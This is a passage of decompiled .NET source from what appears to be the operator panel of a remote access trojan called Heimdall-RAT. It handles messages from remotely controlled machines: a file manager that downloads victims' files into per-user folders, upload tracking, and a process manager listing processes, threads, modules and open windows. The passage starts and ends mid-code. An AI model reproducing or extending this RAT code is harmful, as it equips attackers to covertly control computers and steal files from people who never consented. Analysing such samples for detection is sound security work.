				else if (Operators.CompareString(array[0], "PRS", false) == 0)
				{
					FMGR fMGR17 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					((ToolStripItem)fMGR17.ToolStripStatusLabel1).set_Text(array[1] + SocketServer.Decode(array[2]));
				}
				else if (Operators.CompareString(array[0], "FP", false) == 0)
				{
					FMGR fMGR18 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					if (fMGR18.OPD && ((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("FDUR") == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data23 = this.data;
							((Control)this).Invoke((Delegate)data23, new object[2] { sock, b });
						}
						else
						{
							DwFuGR dwFuGR = new DwFuGR();
							((Control)dwFuGR).set_Name("FDUR");
							((Form)dwFuGR).set_Text(SocketServer.Decode(array[1]));
							((Control)dwFuGR).Show();
						}
					}
				}
				else if (Operators.CompareString(array[0], "DPG", false) == 0)
				{
					DwFuGR dwFuGR2 = (DwFuGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("FDUR");
					dwFuGR2.Label1.set_Text("Progress : " + array[1] + "%");
					dwFuGR2.ProgressBar1.set_Value(int.Parse(array[1]));
					dwFuGR2.Label3.set_Text(array[3] + " KB/s");
					dwFuGR2.Label5.set_Text(array[2]);
				}
				else if (Operators.CompareString(array[0], "DR", false) == 0)
				{
					DwFuGR dwFuGR3 = (DwFuGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("FDUR");
					((Form)dwFuGR3).Close();
				}
				else if (Operators.CompareString(array[0], "Download File", false) == 0)
				{
					FMGR fMGR19 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[1]);
					bool flag = false;
					if (Operators.CompareString(SocketServer.Decode(array[4]), (string)null, false) == 0)
					{
						flag = true;
					}
					else if (File.Exists(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]) + ".ico"))
					{
						fMGR19.ImageList3.get_Images().Add(SocketServer.Decode(array[4]), (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]).ToString() + ".ico"));
					}
					else
					{
						try
						{
							File.Create(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]) + " File." + SocketServer.Decode(array[4])).Close();
							Icon val57 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]) + " File." + SocketServer.Decode(array[4]));
							MultiIcon val58 = new MultiIcon();
							SingleIcon val59 = val58.Add(SocketServer.Decode(array[4]));
							val59.CreateFrom(val57.ToBitmap(), (IconOutputFormat)1);
							val59.Save(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]) + ".ico");
							fMGR19.ImageList3.get_Images().Add(SocketServer.Decode(array[4]), (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + SocketServer.Decode(array[4]).ToString() + ".ico"));
						}
						catch (Exception projectError41)
						{
							ProjectData.SetProjectError(projectError41);
							ProjectData.ClearProjectError();
						}
					}
					object obj6 = ((!flag) ? fMGR19.listDownloads.get_Items().Add(SocketServer.Decode(array[4]), SocketServer.Decode(array[2]), SocketServer.Decode(array[4])) : fMGR19.listDownloads.get_Items().Add(SocketServer.Decode(array[2]), 1));
					NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { SocketServer.GetSize(ulong.Parse(SocketServer.Decode(array[3]))) }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { SocketServer.Decode(array[4]) }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "-" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "Waiting" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateSet(obj6, (Type)null, "ToolTipText", new object[1] { sock }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(obj6, (Type)null, "Tag", new object[1] { "Down" }, (string[])null, (Type[])null);
					s.Send(sock, "Download" + Key + sock);
				}
				else if (Operators.CompareString(array[0], "DWBytes", false) == 0)
				{
					FMGR fMGR20 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[1]);
					try
					{
						IEnumerator enumerator10 = default(IEnumerator);
						try
						{
							enumerator10 = fMGR20.listDownloads.get_Items().GetEnumerator();
							while (enumerator10.MoveNext())
							{
								ListViewItem val60 = (ListViewItem)enumerator10.Current;
								if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[1]) != null)
								{
									if (Operators.CompareString(val60.get_ToolTipText(), array[5], false) != 0)
									{
										continue;
									}
									val60.get_SubItems().get_Item(3).set_Text(array[6]);
									File.WriteAllText(contents: ((Operators.CompareString(array[6], "10", false) != 0) ? File.ReadAllText(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[2]) + "\\Downloads\\" + SocketServer.Decode(array[3])) : null) + array[4], path: Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[2]) + "\\Downloads\\" + SocketServer.Decode(array[3]));
									if (Operators.CompareString(array[6], "110", false) == 0)
									{
										val60.get_SubItems().get_Item(3).set_Text("100%");
										val60.get_SubItems().get_Item(4).set_Text("Finished");
										s.Send(sock, "Abort");
										try
										{
											File.WriteAllBytes(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[2]) + "\\Downloads\\" + SocketServer.Decode(array[7]), Encoding.Default.GetBytes(File.ReadAllText(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[2]) + "\\Downloads\\" + SocketServer.Decode(array[3]))));
										}
										catch (Exception ex)
										{
											ProjectData.SetProjectError(ex);
											Exception ex2 = ex;
											MessageBox.Show(ex2.Message, "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
											ProjectData.ClearProjectError();
										}
										File.Delete(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[2]) + "\\Downloads\\" + SocketServer.Decode(array[3]));
									}
									if (((Operators.CompareString(array[6], "110", false) != 0 && Operators.CompareString(val60.get_SubItems().get_Item(4).get_Text(), "Waiting", false) == 0) ? true : false) | (Operators.CompareString(val60.get_SubItems().get_Item(4).get_Text(), "Downloading", false) == 0))
									{
										val60.get_SubItems().get_Item(3).set_Text(array[6] + "%");
										val60.get_SubItems().get_Item(4).set_Text("Downloading");
									}
									continue;
								}
								s.Send(sock, "Abort");
								break;
							}
						}
						finally
						{
							if (enumerator10 is IDisposable)
							{
								(enumerator10 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError42)
					{
						ProjectData.SetProjectError(projectError42);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Up", false) == 0)
				{
					FMGR fMGR21 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					IEnumerator enumerator11 = default(IEnumerator);
					try
					{
						enumerator11 = fMGR21.listDownloads.get_Items().GetEnumerator();
						while (enumerator11.MoveNext())
						{
							ListViewItem val61 = (ListViewItem)enumerator11.Current;
							if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]) == null)
							{
								s.Send(sock, "Abort");
							}
							if (Operators.ConditionalCompareObjectEqual(val61.get_Tag(), (object)"Up", false))
							{
								if ((Operators.CompareString(val61.get_SubItems().get_Item(4).get_Text(), "Uploading", false) == 0) | (Operators.CompareString(val61.get_SubItems().get_Item(4).get_Text(), "Waiting", false) == 0))
								{
									val61.get_SubItems().get_Item(4).set_Text("Uploading");
									val61.get_SubItems().get_Item(3).set_Text(array[1]);
								}
								if (Operators.CompareString(array[1], "110%", false) == 0)
								{
									val61.get_SubItems().get_Item(3).set_Text("100%");
									val61.get_SubItems().get_Item(4).set_Text("Finished");
								}
							}
						}
					}
					finally
					{
						if (enumerator11 is IDisposable)
						{
							(enumerator11 as IDisposable).Dispose();
						}
					}
				}
				else if (Operators.CompareString(array[0], "System Manager", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data24 = this.data;
							((Control)this).Invoke((Delegate)data24, new object[2] { sock, b });
						}
						else
						{
							SystemM systemM = new SystemM();
							systemM.sock = sock;
							((Control)systemM).set_Name("System Manager" + array[2]);
							((Form)systemM).set_Text("[ System Manager ] [" + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
							((Control)systemM).Show();
						}
					}
				}
				else if (Operators.CompareString(array[0], "Process", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data25 = this.data;
						((Control)this).Invoke((Delegate)data25, new object[2] { sock, b });
						return;
					}
					if (!Directory.Exists(Interaction.Environ("Temp") + "\\HeimdallRATPM\\"))
					{
						Directory.CreateDirectory(Interaction.Environ("Temp") + "\\HeimdallRATPM\\");
					}
					SystemM systemM2 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
					string[] array36 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "ProcessesPluging", -1, (CompareMethod)0);
					string text2 = null;
					systemM2.Processlists.get_Groups().Add("", "Applications ( 0 )");
					try
					{
						int num49 = 0;
						int num50 = array36.Length - 1;
						num49 = 0;
						int num5 = num50;
						if (0 > num5)
						{
							s.Send(sock, "Abort");
						}
						else if (num49 <= array36.Length - 1)
						{
							if (File.Exists(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico"))
							{
								goto IL_9f03;
							}
							if (Operators.CompareString(array36[num49 + 3].ToString(), "-", false) != 0)
							{
								try
								{
									if (!systemM2.ImageList2.get_Images().ContainsKey(array36[num49]))
									{
										Icon val62 = Icon.ExtractAssociatedIcon(array36[num49 + 3]);
										MultiIcon val63 = new MultiIcon();
										SingleIcon val64 = val63.Add(array36[num49]);
										val64.CreateFrom(val62.ToBitmap(), (IconOutputFormat)1);
										val64.Save(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico");
										systemM2.ImageList2.get_Images().Add(array36[num49], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico"));
									}
									else
									{
										systemM2.ImageList2.get_Images().Add(array36[num49], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico"));
									}
								}
								catch (Exception projectError43)
								{
									ProjectData.SetProjectError(projectError43);
									File.Create(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".exe").Close();
									Icon val65 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".exe");
									MultiIcon val66 = new MultiIcon();
									SingleIcon val67 = val66.Add(array36[num49]);
									val67.CreateFrom(val65.ToBitmap(), (IconOutputFormat)1);
									val67.Save(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico");
									File.Delete(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".exe");
									systemM2.ImageList2.get_Images().Add(array36[num49], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico"));
									ProjectData.ClearProjectError();
								}
							}
							goto IL_9f46;
						}
						goto end_IL_9843;
						IL_9f46:
						if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) != null)
						{
							try
							{
								if (array36[num49 + 3].Length > 3)
								{
									ListViewItem val68 = systemM2.Processlists.get_Items().Add(new ListViewItem(new string[1] { array36[num49] }, array36[num49], systemM2.Processlists.get_Groups().get_Item(systemM2.Processlists.get_Groups().get_Count() - 1)));
									val68.get_SubItems().Add(array36[num49 + 1]);
									val68.get_SubItems().Add(array36[num49 + 2]);
									val68.get_SubItems().Add(array36[num49 + 3]);
									val68.get_SubItems().Add(array36[num49 + 4]);
									val68.get_SubItems().Add(array36[num49 + 5]);
									val68.get_SubItems().Add(array36[num49 + 6]);
									val68.get_SubItems().Add(array36[num49 + 7]);
									val68.get_SubItems().Add(array36[num49 + 8]);
								}
								else
								{
									text2 = text2 + array36[num49] + "|" + array36[num49 + 1] + "|" + array36[num49 + 2] + "|" + array36[num49 + 3] + "|" + array36[num49 + 4] + "|" + array36[num49 + 5] + "|" + array36[num49 + 6] + "|" + array36[num49 + 7] + "|" + array36[num49 + 8] + "|";
								}
							}
							catch (Exception projectError44)
							{
								ProjectData.SetProjectError(projectError44);
								text2 = text2 + array36[num49] + "|" + array36[num49 + 1] + "|" + array36[num49 + 2] + "|" + array36[num49 + 3] + "|" + array36[num49 + 4] + "|" + array36[num49 + 5] + "|" + array36[num49 + 6] + "|" + array36[num49 + 7] + "|" + array36[num49 + 8] + "|";
								ProjectData.ClearProjectError();
							}
							num49 += 8;
							num49++;
							goto IL_9f03;
						}
						goto end_IL_9843;
						IL_9f03:
						systemM2.ImageList2.get_Images().Add(array36[num49], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array36[num49] + ".ico"));
						goto IL_9f46;
						end_IL_9843:;
					}
					catch (Exception projectError45)
					{
						ProjectData.SetProjectError(projectError45);
						ProjectData.ClearProjectError();
					}
					try
					{
						IEnumerator enumerator12 = default(IEnumerator);
						try
						{
							enumerator12 = systemM2.Processlists.get_Groups().GetEnumerator();
							while (enumerator12.MoveNext())
							{
								ListViewGroup val69 = (ListViewGroup)enumerator12.Current;
								if (Operators.CompareString(val69.get_Header(), "Applications ( 0 )", false) == 0)
								{
									val69.set_Header("Applications ( 0 )".Replace("0", systemM2.Processlists.get_Items().get_Count().ToString()));
								}
							}
						}
						finally
						{
							if (enumerator12 is IDisposable)
							{
								(enumerator12 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError46)
					{
						ProjectData.SetProjectError(projectError46);
						ProjectData.ClearProjectError();
					}
					int num51 = 0;
					try
					{
						if (!Directory.Exists(Interaction.Environ("Temp") + "\\HeimdallRATPM\\"))
						{
							Directory.CreateDirectory(Interaction.Environ("Temp") + "\\HeimdallRATPM\\");
						}
						string[] array37 = Strings.Split(text2, "|", -1, (CompareMethod)0);
						systemM2.Processlists.get_Groups().Add("", "System Idle Process ( 0 )");
						try
						{
							int num52 = 0;
							int num53 = array36.Length;
							num52 = 0;
							int num5 = num53;
							if (0 > num5)
							{
								s.Send(sock, "Abort");
							}
							else if (num52 <= array37.Length)
							{
								num51++;
								if (File.Exists(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico"))
								{
									goto IL_a4ef;
								}
								if (Operators.CompareString(array37[num52 + 3].ToString(), "-", false) != 0)
								{
									try
									{
										if (!systemM2.ImageList2.get_Images().ContainsKey(array37[num52]))
										{
											Icon val70 = Icon.ExtractAssociatedIcon(array37[num52 + 3]);
											MultiIcon val71 = new MultiIcon();
											SingleIcon val72 = val71.Add(array37[num52]);
											val72.CreateFrom(val70.ToBitmap(), (IconOutputFormat)1);
											val72.Save(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico");
											systemM2.ImageList2.get_Images().Add(array37[num52], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico"));
										}
										else
										{
											systemM2.ImageList2.get_Images().Add(array37[num52], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico"));
										}
									}
									catch (Exception projectError47)
									{
										ProjectData.SetProjectError(projectError47);
										File.Create(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".exe").Close();
										Icon val73 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".exe");
										MultiIcon val74 = new MultiIcon();
										SingleIcon val75 = val74.Add(array37[num52]);
										val75.CreateFrom(val73.ToBitmap(), (IconOutputFormat)1);
										val75.Save(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico");
										File.Delete(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".exe");
										systemM2.ImageList2.get_Images().Add(array37[num52], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico"));
										ProjectData.ClearProjectError();
									}
								}
								goto IL_a532;
							}
							goto end_IL_a0a6;
							IL_a532:
							if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) != null)
							{
								ListViewItem val76 = systemM2.Processlists.get_Items().Add(new ListViewItem(new string[1] { array37[num52] }, array37[num52], systemM2.Processlists.get_Groups().get_Item(systemM2.Processlists.get_Groups().get_Count() - 1)));
								val76.get_SubItems().Add(array37[num52 + 1]);
								val76.get_SubItems().Add(array37[num52 + 2]);
								val76.get_SubItems().Add(array37[num52 + 3]);
								val76.get_SubItems().Add(array37[num52 + 4]);
								val76.get_SubItems().Add(array37[num52 + 5]);
								val76.get_SubItems().Add(array37[num52 + 6]);
								val76.get_SubItems().Add(array37[num52 + 7]);
								val76.get_SubItems().Add(array37[num52 + 8]);
								num52 += 8;
								num52++;
								goto IL_a4ef;
							}
							goto end_IL_a0a6;
							IL_a4ef:
							systemM2.ImageList2.get_Images().Add(array37[num52], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array37[num52] + ".ico"));
							goto IL_a532;
							end_IL_a0a6:;
						}
						catch (Exception projectError48)
						{
							ProjectData.SetProjectError(projectError48);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError49)
					{
						ProjectData.SetProjectError(projectError49);
						ProjectData.ClearProjectError();
					}
					try
					{
						IEnumerator enumerator13 = default(IEnumerator);
						try
						{
							enumerator13 = systemM2.Processlists.get_Groups().GetEnumerator();
							while (enumerator13.MoveNext())
							{
								ListViewGroup val77 = (ListViewGroup)enumerator13.Current;
								if (Operators.CompareString(val77.get_Header(), "System Idle Process ( 0 )", false) == 0)
								{
									val77.set_Header("System Idle Process ( 0 )".Replace("0", (num51 - 1).ToString()));
								}
							}
						}
						finally
						{
							if (enumerator13 is IDisposable)
							{
								(enumerator13 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError50)
					{
						ProjectData.SetProjectError(projectError50);
						ProjectData.ClearProjectError();
					}
					try
					{
						systemM2.Processlists.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError51)
					{
						ProjectData.SetProjectError(projectError51);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Process Result", false) == 0)
				{
					SystemM systemM3 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
					if (Operators.CompareString(array[1], "List of processes successfully created", false) == 0)
					{
						((Control)systemM3.Processlists).set_Enabled(true);
						((ToolStripItem)systemM3.ToolStripStatusLabel4).set_Text("- List of processes successfully created");
						((ToolStripItem)systemM3.ToolStripStatusLabel1).set_Text("Processs : ( " + systemM3.Processlists.get_Items().get_Count() + " )");
						systemM3.Processlists.FindItemWithText(SocketServer.Decode(array[3])).set_ForeColor(Color.Red);
						((ToolStripItem)systemM3.ToolStripStatusLabel2).set_Text("- Free Physical Memory : " + SocketServer.Decode(array[4]));
					}
					else
					{
						((ToolStripItem)systemM3.ToolStripStatusLabel4).set_Text("- " + array[1]);
					}
				}
				else if (Operators.CompareString(array[0], "Remove From Process List", false) == 0)
				{
					SystemM systemM4 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
					try
					{
						IEnumerator enumerator14 = default(IEnumerator);
						try
						{
							enumerator14 = systemM4.Processlists.get_Items().GetEnumerator();
							while (enumerator14.MoveNext())
							{
								ListViewItem val78 = (ListViewItem)enumerator14.Current;
								if (Operators.CompareString(val78.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
								{
									val78.Remove();
								}
							}
						}
						finally
						{
							if (enumerator14 is IDisposable)
							{
								(enumerator14 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError52)
					{
						ProjectData.SetProjectError(projectError52);
						ProjectData.ClearProjectError();
					}
					((ToolStripItem)systemM4.ToolStripStatusLabel1).set_Text("Processs: ( " + systemM4.Processlists.get_Items().get_Count() + " )");
				}
				else if (Operators.CompareString(array[0], "Process Properties", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data26 = this.data;
						((Control)this).Invoke((Delegate)data26, new object[2] { sock, b });
					}
					else
					{
						PPGR pPGR = new PPGR();
						SystemM systemM5 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]);
						((Control)systemM5.Processlists).set_Enabled(true);
						((ToolStripItem)systemM5.ToolStripStatusLabel1).set_Text("Ready to any command!");
						((Control)pPGR).set_Name("Process Properties" + array[1]);
						string[] array38 = Strings.Split(SocketServer.Decode(array[3]), "RENA", -1, (CompareMethod)0);
						pPGR.PictureBox1.set_Image(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array[2]))));
						if (!Directory.Exists(Interaction.Environ("Temp") + "\\HeimdallRATPM\\"))
						{
							Directory.CreateDirectory(Interaction.Environ("Temp") + "\\HeimdallRATPM\\");
						}
						pPGR.PictureBox1.get_Image().Save(Interaction.Environ("Temp") + "\\HeimdallRATPM\\" + array38[4] + ".ico");
						((Form)pPGR).set_Icon(Icon.FromHandle(new Bitmap(pPGR.PictureBox1.get_Image()).GetHicon()));
						pPGR.Sock = sock;
						if (array38[0].Length > 0)
						{
							pPGR.Label1.set_Text(array38[0]);
						}
						else
						{
							pPGR.Label1.set_Text("N/A");
						}
						if (array38[1].Length > 0)
						{
							pPGR.Label2.set_Text(array38[1]);
						}
						else
						{
							pPGR.Label2.set_Text("N/A");
						}
						pPGR.Label3.set_Text("Version : " + array38[2]);
						pPGR.IFN.set_Text(array38[3]);
						pPGR.Label4.set_Text("Process Name : " + array38[4]);
						if (array38[5].Length > 0)
						{
							pPGR.Label5.set_Text("Process Window Title : " + array38[5]);
						}
						else
						{
							pPGR.Label5.set_Text("Process Window Title : N/A");
						}
						pPGR.Label6.set_Text("Process PID : " + array38[6]);
						pPGR.Label7.set_Text("Process Module Name : " + array38[7]);
						pPGR.Label8.set_Text("Process Priority : " + array38[8]);
						pPGR.Label9.set_Text("Process Responding : " + array38[9]);
						pPGR.Label10.set_Text("Process Threads : " + array38[10]);
						pPGR.Label11.set_Text("Process Modules : " + array38[11]);
						((Form)pPGR).set_Text(array38[4] + ".exe " + "(.)".Replace(".", array38[6]) + " Properties");
						pPGR.PID = Conversions.ToInteger(array38[6]);
						((Control)pPGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "Process Threads", false) == 0)
				{
					if (Operators.CompareString(SocketServer.Decode(array[2]), "Null", false) != 0)
					{
						return;
					}
					if (((Control)this).get_InvokeRequired())
					{
						_data data27 = this.data;
						((Control)this).Invoke((Delegate)data27, new object[2] { sock, b });
						return;
					}
					PPGR pPGR2 = (PPGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Process Properties" + array[1]);
					string[] array39 = Strings.Split(Convert.ToString(SocketServer.Decode(array[2])), "|", -1, (CompareMethod)0);
					int num54 = 0;
					int num55 = array39.Length - 2;
					num54 = 0;
					while (true)
					{
						int num56 = num54;
						int num5 = num55;
						if (num56 > num5)
						{
							break;
						}
						ListViewItem val79 = pPGR2.ThreadsList.get_Items().Add(array39[num54]);
						val79.get_SubItems().Add(array39[num54 + 1]);
						val79.get_SubItems().Add(array39[num54 + 2]);
						val79.get_SubItems().Add(array39[num54 + 3]);
						num54 += 3;
						num54++;
						num54 += 0;
					}
					((ToolStripItem)pPGR2.ToolStripStatusLabel1).set_Text("Threads Count : ( 0 )".Replace("0", Convert.ToString(pPGR2.ThreadsList.get_Items().get_Count())));
					try
					{
						pPGR2.ThreadsList.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError53)
					{
						ProjectData.SetProjectError(projectError53);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(array[0], "Process Modules", false) == 0)
				{
					if (Operators.CompareString(SocketServer.Decode(array[2]), "Null", false) != 0)
					{
						return;
					}
					if (!((Control)this).get_InvokeRequired())
					{
						PPGR pPGR3 = (PPGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Process Properties" + array[1]);
						string[] array40 = Strings.Split(Convert.ToString(SocketServer.Decode(array[2])), "|", -1, (CompareMethod)0);
						int num57 = 0;
						int num58 = array40.Length - 2;
						num57 = 0;
						while (true)
						{
							int num59 = num57;
							int num5 = num58;
							if (num59 > num5)
							{
								break;
							}
							ListViewItem val80 = pPGR3.ModulesListview.get_Items().Add(array40[num57]);
							val80.get_SubItems().Add(array40[num57 + 1]);
							val80.get_SubItems().Add(array40[num57 + 2]);
							val80.get_SubItems().Add(array40[num57 + 3]);
							num57 += 3;
							num57++;
							num57 += 0;
						}
						((ToolStripItem)pPGR3.ToolStripStatusLabel2).set_Text("Modules Count : ( 0 )".Replace("0", Convert.ToString(pPGR3.ModulesListview.get_Items().get_Count())));
						try
						{
							pPGR3.ModulesListview.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
							return;
						}
						catch (Exception projectError54)
						{
							ProjectData.SetProjectError(projectError54);
							ProjectData.ClearProjectError();
							return;
						}
					}
					_data data28 = this.data;
					((Control)this).Invoke((Delegate)data28, new object[2] { sock, b });
				}
				else
				{
					if (Operators.CompareString(array[0], "Change Color", false) == 0)
					{
						SystemM systemM6 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						if (Operators.CompareString(SocketServer.Decode(array[2]), "S", false) == 0)
						{
							try
							{
								IEnumerator enumerator15 = default(IEnumerator);
								try
								{
									enumerator15 = systemM6.Processlists.get_Items().GetEnumerator();
									while (enumerator15.MoveNext())
									{
										ListViewItem val81 = (ListViewItem)enumerator15.Current;
										if (Operators.CompareString(val81.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val81.set_ForeColor(Color.DimGray);
										}
									}
								}
								finally
								{
									if (enumerator15 is IDisposable)
									{
										(enumerator15 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError55)
							{
								ProjectData.SetProjectError(projectError55);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(SocketServer.Decode(array[2]), "R", false) != 0)
						{
							return;
						}
						try
						{
							IEnumerator enumerator16 = default(IEnumerator);
							try
							{
								enumerator16 = systemM6.Processlists.get_Items().GetEnumerator();
								while (enumerator16.MoveNext())
								{
									ListViewItem val82 = (ListViewItem)enumerator16.Current;
									if (Operators.CompareString(val82.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
									{
										val82.set_ForeColor(Color.DarkGreen);
									}
								}
								return;
							}
							finally
							{
								if (enumerator16 is IDisposable)
								{
									(enumerator16 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError56)
						{
							ProjectData.SetProjectError(projectError56);
							ProjectData.ClearProjectError();
							return;
						}
					}
					if (Operators.CompareString(array[0], "CPRES", false) == 0)
					{
						SystemM systemM7 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						if (Operators.CompareString(array[1], "D", false) == 0)
						{
							((ToolStripItem)systemM7.ToolStripStatusLabel4).set_Text("-  " + array[2] + " successfully started");
						}
						else if (Operators.CompareString(array[1], "F", false) == 0)
						{
							((ToolStripItem)systemM7.ToolStripStatusLabel4).set_Text("-  " + array[2] + " unsuccessfully started");
						}
					}
					else if (Operators.CompareString(array[0], "SendActivteWindows", false) == 0)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data29 = this.data;
							((Control)this).Invoke((Delegate)data29, new object[2] { sock, b });
							return;
						}
						SystemM systemM8 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
						string[] array41 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "*RVR*", -1, (CompareMethod)0);
						string text3 = string.Empty;
						int num60 = 0;
						try
						{
							systemM8.AW.get_Groups().Add("", "Visible ( 0 )");
							int num61 = 0;
							int num62 = array41.Length - 1;
							num61 = 0;
							while (true)
							{
								int num63 = num61;
								int num5 = num62;
								if (num63 > num5)
								{
									break;
								}
								if (!Convert.ToBoolean(array41[num61 + 2]))
								{
									if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) == null)
									{
										s.Send(sock, "Abort");
										break;
									}
